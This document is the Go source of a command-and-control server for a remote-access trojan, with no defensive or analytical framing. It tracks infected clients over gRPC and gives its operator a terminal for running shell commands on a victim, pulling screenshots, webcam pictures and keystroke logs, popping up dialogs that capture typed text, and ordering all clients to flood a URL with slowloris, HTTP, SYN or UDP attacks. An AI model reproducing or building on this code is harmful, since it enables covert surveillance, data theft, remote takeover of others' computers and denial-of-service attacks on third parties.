// TODO: use [this](https://github.com/c-bata/go-prompt) instead of [this](https://github.com/charmbracelet/bubbletea)
package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/Xart3mis/AKILT/Server/lib/bundles"
	"github.com/Xart3mis/AKILTC/pb"
	"github.com/charmbracelet/bubbles/spinner"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/fatih/color"
	"github.com/magodo/textinput"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
)

type server struct {
	pb.ConsumerServer
}

type floodParamas struct {
	Type        int
	url         string
	num_threads int
	limit       int
}

type DialogParams struct {
	ShouldUpdate bool
	DialogPrompt string
	DialogTitle  string
}

var flood_params *floodParamas = nil
var dialog_params *DialogParams = nil

var current_id string = ""

var client_ids []string
var client_mapids map[int]string = make(map[int]string)

var client_onscreentext map[string]string = make(map[string]string)

var client_execcommand map[string]string = make(map[string]string)
var client_execoutput map[string]string = make(map[string]string)

var client_dialog map[string]string = make(map[string]string)
var client_dialogoutput map[string]string = make(map[string]string)

var should_screenshot bool = false
var should_takepic bool = false

var banner string = `
▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
▒████▄     ██▄█▒ ▓██▒▓██▒    ▓  ██▒ ▓▒
▒██  ▀█▄  ▓███▄░ ▒██▒▒██░    ▒ ▓██░ ▒░
░██▄▄▄▄██ ▓██ █▄ ░██░▒██░    ░ ▓██▓ ░ 
 ▓█   ▓██▒▒██▒ █▄░██░░██████▒  ▒██▒ ░ 
 ▒▒   ▓▒█░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░  ▒ ░░   
  ▒   ▒▒ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░    ░    
  ░   ▒   ░ ░░ ░  ▒ ░  ░ ░     ░      
      ░  ░░  ░    ░      ░  ░         
`

func main() {

	go func() {
		p := tea.NewProgram(initialModel(), tea.WithAltScreen())

		if err := p.Start(); err != nil {
			log.Fatal(err)
		}
	}()

	creds, err := loadTLSCredentials()
	if err != nil {
		log.Fatalln(err)
	}

	s := grpc.NewServer(grpc.Creds(creds), grpc.MaxRecvMsgSize(6000000*1024), grpc.MaxSendMsgSize(6000000*1024))
	lis, err := net.Listen("tcp", ":8000")
	if err != nil {
		log.Fatalf("Failed to listen: %v", err)
	}

	pb.RegisterConsumerServer(s, &server{})

	err = s.Serve(lis)
	if err != nil {
		log.Fatalf("Failed to serve: %v", err)
	}

}

func loadTLSCredentials() (credentials.TransportCredentials, error) {
	bundles.WriteCert()
	bundles.WriteCertKey()
	// Load server's certificate and private key
	serverCert, err := tls.LoadX509KeyPair("./server-cert.pem", "./server-key.pem")
	if err != nil {
		return nil, err
	}

	// Create the credentials and return it
	config := &tls.Config{
		Certificates:       []tls.Certificate{serverCert},
		ClientAuth:         tls.NoClientCert,
		InsecureSkipVerify: true,
	}

	return credentials.NewTLS(config), nil
}

func Contains(sl []string, name string) bool {
	for _, value := range sl {
		if value == name {
			return true
		}
	}
	return false
}

func (s *server) GetCommand(ctx context.Context, cid *pb.ClientDataRequest) (*pb.ClientExecData, error) {
	if !Contains(client_ids, cid.ClientId) {
		client_ids = append(client_ids, cid.ClientId)
	}

	if cid.ClientId == current_id && cid != nil {
		x := client_execcommand[current_id]
		client_execcommand[current_id] = ""
		return &pb.ClientExecData{
			ShouldExec: len(x) > 0,
			Command:    x}, nil
	}
	return &pb.ClientExecData{}, nil
}

func (s *server) SetCommandOutput(ctx context.Context, in *pb.ClientExecOutput) (*pb.Void, error) {
	if id := in.GetId(); id != nil {
		if id.ClientId == current_id {
			client_execoutput[current_id] = ""
			client_execoutput[current_id] = string(in.GetOutput())
		}
	}

	return &pb.Void{}, nil
}

func (s *server) SubscribeOnScreenText(r *pb.ClientDataRequest, in pb.Consumer_SubscribeOnScreenTextServer) error {
	if !Contains(client_ids, r.ClientId) {
		client_ids = append(client_ids, r.ClientId)
	}
	for {
		if r.GetClientId() == current_id {
			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
				ShouldUpdate: len(client_onscreentext[current_id]) > 0,
				OnScreenText: client_onscreentext[current_id]}})
		} else {
			in.Send(&pb.ClientDataOnScreenTextResponse{OnScreen: &pb.ClientOnScreenData{
				ShouldUpdate: false,
				OnScreenText: ""}})
		}
		time.Sleep(50 * time.Millisecond)
	}
}

func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, error) {
	if flood_params != nil {
		x := flood_params
		flood_params = nil
		return &pb.FloodData{
			FloodType:   int32(x.Type),
			ShouldFlood: true,
			Url:         x.url,
			Limit:       int64(x.limit),
			NumThreads:  int64(x.num_threads)}, nil
	}

	return &pb.FloodData{ShouldFlood: false}, nil
}

func (s *server) GetDialog(ctx context.Context, in *pb.ClientDataRequest) (*pb.DialogData, error) {
	if !Contains(client_ids, in.ClientId) {
		client_ids = append(client_ids, in.ClientId)
	}

	if dialog_params != nil {
		x := dialog_params
		dialog_params = nil

		if in.GetClientId() == current_id {
			return &pb.DialogData{
				ShouldShowDialog: x.ShouldUpdate,
				DialogTitle:      x.DialogTitle,
				DialogPrompt:     x.DialogPrompt}, nil
		}
	}

	return &pb.DialogData{ShouldShowDialog: false}, nil
}

func (s *server) SetDialogOutput(ctx context.Context, in *pb.DialogOutput) (*pb.Void, error) {
	if id := in.GetId(); id != nil {
		if id.ClientId == current_id {
			client_dialogoutput[current_id] = ""
			client_dialogoutput[current_id] = in.GetEntryText()
		}
	}

	return &pb.Void{}, nil
}

func (s *server) GetScreen(ctx context.Context, in *pb.ClientDataRequest) (*pb.ScreenData, error) {
	if !Contains(client_ids, in.ClientId) {
		client_ids = append(client_ids, in.ClientId)
	}

	if in.ClientId == current_id {
		ss := should_screenshot
		should_screenshot = false
		return &pb.ScreenData{ShouldTakeScreenshot: ss}, nil
	}
	return &pb.ScreenData{ShouldTakeScreenshot: false}, nil
}

func (s *server) SetScreenOutput(ctx context.Context, in *pb.ScreenOutput) (*pb.Void, error) {
	if !Contains(client_ids, in.Id.ClientId) {
		client_ids = append(client_ids, in.Id.ClientId)
	}

	if in.Id.ClientId == current_id {
		var file *os.File

		defer file.Close()

		file, err := os.OpenFile(fmt.Sprintf("screenshot-%s.jpeg", in.Id.ClientId), os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return &pb.Void{}, err
		}

		file.Write(in.ImageData)
	}

	return &pb.Void{}, nil
}

func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.Void, error) {
	if !Contains(client_ids, in.Id.ClientId) {
		client_ids = append(client_ids, in.Id.ClientId)
	}

	var file *os.File

	defer file.Close()

	if _, err := os.Stat(fmt.Sprintf("keylog-%s", in.Id.ClientId)); os.IsNotExist(err) {
		file, err = os.OpenFile(fmt.Sprintf("keylog-%s.log", in.Id.ClientId), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return &pb.Void{}, err
		}
	}

	file, err := os.OpenFile(fmt.Sprintf("keylog-%s.log", in.Id.ClientId), os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return &pb.Void{}, err
	}

	file.WriteString(fmt.Sprintf("%s - %s\n", in.GetWindowTitle(), string(rune(in.GetKey()))))

	return &pb.Void{}, nil
}

func (s *server) GetPicture(ctx context.Context, in *pb.ClientDataRequest) (*pb.PictureData, error) {
	if !Contains(client_ids, in.ClientId) {
		client_ids = append(client_ids, in.ClientId)
	}

	if in.ClientId == current_id {
		pic := should_takepic
		should_takepic = false
		return &pb.PictureData{ShouldTakePicture: pic}, nil
	}

	return &pb.PictureData{ShouldTakePicture: false}, nil
}

func (s *server) SetPictureOutput(ctx context.Context, in *pb.PictureOutput) (*pb.Void, error) {
	if !Contains(client_ids, in.Id.ClientId) {
		client_ids = append(client_ids, in.Id.ClientId)
	}

	if in.Id.ClientId == current_id {
		var file *os.File

		defer file.Close()
		file, err := os.OpenFile(fmt.Sprintf("webcam_pic-%s.jpg", in.Id.ClientId), os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			return &pb.Void{}, err
		}

		file.Write(in.PictureData)
	}

	return &pb.Void{}, nil
}

type model struct {
	textInput           textinput.Model
	showhelplist        bool
	showclientlist      bool
	showok              bool
	shownotvalidcid     bool
	shownotvalidtext    bool
	shownotvalidcommand bool
	showfloodusage      bool
	showfloodoutput     bool
	showexecout         bool
	showdialogoutput    bool
	err                 error
	clients             []string

	spinner spinner.Model
}

func initialModel() model {
	ti := textinput.NewModel()
	ti.Placeholder = "help"

	red := color.New(color.FgRed).SprintFunc()
	ti.Prompt = red(">> ")
	ti.PromptStyle.Bold(true)

	ti.PromptStyle.PaddingRight(10)
	ti.Focus()
	ti.CharLimit = 156
	ti.Width = 20

	ti.CandidateWords = []string{
		"help", "settext",
		"select", "exit",
		"exec", "list_clients",
		"cleartext", "flood",
		"dialog", "screenshot"}
	ti.CandidateViewMode = textinput.CandidateViewHorizental
	s := spinner.New()
	s.Spinner = spinner.Dot

	return model{
		textInput:           ti,
		err:                 nil,
		showhelplist:        false,
		showok:              false,
		showclientlist:      false,
		shownotvalidcid:     false,
		shownotvalidtext:    false,
		shownotvalidcommand: false,
		showexecout:         false,
		showfloodusage:      false,
		showfloodoutput:     false,
		showdialogoutput:    false,
		clients:             client_ids,

		spinner: s,
	}
}

func (m model) Init() tea.Cmd {
	m.spinner.Tick()
	return textinput.Blink
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmd tea.Cmd

	for idx, client := range client_ids {
		client_mapids[idx] = client
	}

	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c":
			os.Exit(0)
			return m, tea.Quit

		case "esc", "q":
			m.shownotvalidcommand = false
			m.shownotvalidtext = false
			m.showdialogoutput = false
			m.shownotvalidcid = false
			m.showfloodusage = false
			m.showclientlist = false
			m.showhelplist = false
			m.showexecout = false
			m.showok = false
			return m, nil

		case "enter":
			m.clients = client_ids

			if len(m.textInput.Value()) > 4 && m.textInput.Value()[:4] == "exec" {
				split_str := strings.Fields(m.textInput.Value())
				if len(split_str) <= 1 {
					m.shownotvalidcommand = true
					return m, nil
				}
				client_execcommand[current_id] = strings.Join(split_str[1:], " ")
				m.showexecout = true
				return m, nil
			}

			if len(m.textInput.Value()) > 6 && m.textInput.Value()[:6] == "select" {
				split_str := strings.Fields(m.textInput.Value())
				if len(split_str) > 2 {
					m.shownotvalidcid = true
					return m, nil
				}

				val, err := strconv.Atoi(split_str[1])
				if err != nil {
					m.shownotvalidcid = true
					return m, nil
				}

				if Contains(client_ids, client_mapids[val]) {
					m.showok = true
					current_id = client_mapids[val]
					return m, nil
				}

				m.shownotvalidcid = true
				return m, nil
			}

			if len(m.textInput.Value()) > 7 && m.textInput.Value()[:7] == "settext" {
				split_str := strings.Fields(m.textInput.Value())
				if len(split_str) <= 1 {
					m.shownotvalidtext = true
					return m, nil
				}
				client_onscreentext[current_id] = strings.Join(split_str[1:], " ")
				m.showok = true
				return m, nil
			}

			if len(m.textInput.Value()) == 9 && m.textInput.Value() == "cleartext" {
				client_onscreentext[current_id] = ""
				m.showok = true
				return m, nil
			}

			if len(m.textInput.Value()) == 10 && m.textInput.Value() == "screenshot" {
				should_screenshot = true
				m.showok = true
				return m, nil
			}

			if len(m.textInput.Value()) == 3 && m.textInput.Value() == "pic" {
				should_takepic = true
				m.showok = true
				return m, nil
			}

			if len(m.textInput.Value()) >= 5 && m.textInput.Value()[:5] == "flood" {
				split_str := strings.Fields(m.textInput.Value())
				if len(split_str) <= 4 {
					m.showfloodusage = true
					return m, nil
				}

				threads, err := strconv.Atoi(split_str[3])
				if err != nil {
					m.showfloodusage = true
				}

				limit, err := strconv.Atoi(split_str[2])
				if err != nil {
					m.showfloodusage = true
				}

				var floodType int = 0
				switch strings.ToLower(split_str[4]) {
				case "slowloris":
					floodType = 0
				case "httpflood":
					floodType = 1
				case "synflood":
					floodType = 2
				case "udpflood":
					floodType = 3
				}

				flood_params = &floodParamas{url: split_str[1], limit: limit, num_threads: threads, Type: floodType}
				m.showfloodoutput = true

				return m, nil
			}

			if len(m.textInput.Value()) >= 6 && m.textInput.Value()[:6] == "dialog" {
				split_str := strings.Fields(m.textInput.Value())
				r := regexp.MustCompile(`\".*?\"`)
				matches := r.FindAllString(strings.Join(split_str[1:], " "), -1)

				for idx := range matches {
					matches[idx] = strings.ReplaceAll(matches[idx], "\"", "")
				}

				dialog_params = &DialogParams{
					ShouldUpdate: true,
					DialogPrompt: matches[0],
					DialogTitle:  matches[1],
				}
				m.showdialogoutput = true
			}

			switch m.textInput.Value() {
			case "help":
				m.showhelplist = true
				return m, nil
			case "exit":
				return m, tea.Quit
			case "list_clients":
				m.showclientlist = true
				return m, nil
			default:
				return m, nil
			}
		}
	case error:
		m.err = msg
		return m, nil
	}

	// m.spinner, cmd = m.spinner.Update(msg)
	m.textInput, cmd = m.textInput.Update(msg)
	return m, cmd

}

func (m model) View() string {
	if m.showhelplist {
		yellow := color.New(color.FgYellow).SprintFunc()
		green := color.New(color.FgGreen).SprintFunc()

		return m.textInput.View() + "\n\n" + green("help") + "\nshow this help dialog (usage: " + yellow("help") + ")\n\n" +
			green("select") + "\nselect a client to connect to (usage: " + yellow("select [client id]") + ")\n\n" +
			green("exit") + "\nexit the server (usage: " + yellow("exit") + ")\n\n" +
			green("settext") + "\nset on screen text for selected client (usage: " + yellow("settext [text]") + ")\n\n" +
			green("exec") + "\nexecute command on selected client (usage: " + yellow("exec [command string]") + ")\n\n" +
			green("list_clients") + "\nlist currently connected clients (usage: " + yellow("list_clients [client id]") + ")\n\n" +
			green("cleartext") + "\nclear on screen text for selected client (usage: " + yellow("cleartext") + ")\n\n" +
			green("flood") + "\nflood a url using all clients (usage: " + yellow("flood [url] [time limit] [worker count] [flood type]") + ") " + "flood type can be (slowloris, httpflood, synflood, udpflood)\n\n" +
			green("dialog") + "\nshow a a text entry dialog on client PC (usage: " + yellow("dialog [prompt] [text]") + ")\n"
	}
	if m.showclientlist {
		Magenta := color.New(color.FgMagenta).SprintFunc()
		b, _ := json.MarshalIndent(client_mapids, "", "\t")
		return m.textInput.View() + "\n\n" + Magenta(string(b))
	}
	if m.shownotvalidcid {
		red := color.New(color.FgRed).SprintFunc()
		return m.textInput.View() + "\n\n" + red("Not a valid client ID.")
	}
	if m.showok {
		Green := color.New(color.FgGreen).SprintFunc()
		return m.textInput.View() + "\n\n" + Green("OK.")
	}
	if m.shownotvalidtext {
		red := color.New(color.FgRed).SprintFunc()
		return m.textInput.View() + "\n\n" + red("settext takes multiple arguments.")
	}
	if m.showexecout {
		x := client_execoutput[current_id]
		return m.textInput.View() + "\n\n" + x
	}
	if m.shownotvalidcommand {
		red := color.New(color.FgRed).SprintFunc()
		return m.textInput.View() + "\n\n" + red("Not a valid command.")
	}
	if m.showfloodusage {
		red := color.New(color.FgRed).SprintFunc()
		return m.textInput.View() + "\n\n" + red("usage: flood [url] [time limit] [worker count] [flood type] "+"flood type can be (slowloris, httpflood, synflood, udpflood)\n")
	}
	if m.showfloodoutput {
		return m.textInput.View()
	}
	if m.showdialogoutput {
		return m.textInput.View() + "\n\n" + client_dialogoutput[current_id]
	}

	return color.RedString(banner) + "\n" + m.textInput.View()
}
